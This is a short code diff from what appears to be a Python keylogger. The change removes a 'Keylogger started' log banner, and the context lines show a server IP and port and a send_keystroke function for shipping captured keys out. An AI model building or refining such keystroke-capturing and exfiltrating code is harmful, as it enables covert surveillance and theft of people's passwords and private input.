@@ -6,8 +6,7 @@ SERVER_IP = '192.168.0.195'
 SERVER_PORT = 5001
 
 # Ensure log file exists
-with open(LOG_FILE, 'a') as f:
-    f.write(f'\n--- Keylogger started at {datetime.now()} ---\n')
+
 
 def send_keystroke(data):
     try:
